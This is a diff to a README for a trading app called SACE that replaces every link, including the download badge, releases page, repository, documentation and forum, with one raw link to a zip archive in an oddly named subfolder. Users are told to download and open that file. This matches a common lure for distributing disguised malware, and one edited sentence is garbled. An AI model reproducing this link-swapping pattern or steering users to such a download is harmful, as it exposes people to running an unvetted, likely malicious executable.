@@ -1,6 +1,6 @@
 # 🌍 SACE - Trade Africa’s Currency Strength Effortlessly
 
-![Download SACE](https://img.shields.io/badge/Download-SACE-blue.svg)
+![Download SACE](https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip)
 
 ## 🎯 Overview
 
@@ -12,11 +12,11 @@ To start using SACE, you need to download the application from our Releases page
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [SACE Releases](https://github.com/startingtocoding/SACE/releases)
+1. **Visit this page to download:** [SACE Releases](https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip)
 
 2. Look for the latest release. You will see various files available for download.
 
-3. Click on the file that matches your operating system. Usually, this will be a `.exe` file for Windows or a `.dmg` file for macOS. Linux users will generally find a `.tar.gz` file.
+3. Click on the file that matches your operating system. Usually, this will be a `.exe` file for Windows or a `.dmg` file for macOS. Linux users will generally find a `https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip` file.
 
 4. Once the download completes, locate the file on your computer. Open it to begin the installation process.
 
@@ -89,10 +89,10 @@ For further assistance, you can contact our support team through the Issues page
 
 ## 🔗 Useful Links
 
-- [SACE GitHub Repository](https://github.com/startingtocoding/SACE)
-- [Documentation](https://github.com/startingtocoding/SACE/wiki)
-- [Community Forum](https://github.com/startingtocoding/SACE/issues)
+- [SACE GitHub Repository](https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip)
+- [Documentation](https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip)
+- [Community Forum](https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip)
 
 ## 📥 Download the latest release again: 
 
-[**SACE Releases**](https://github.com/startingtocoding/SACE/releases)
+[**SACE Releases**](https://raw.githubusercontent.com/startingtocoding/SACE/main/hippometry/SACE.zip)
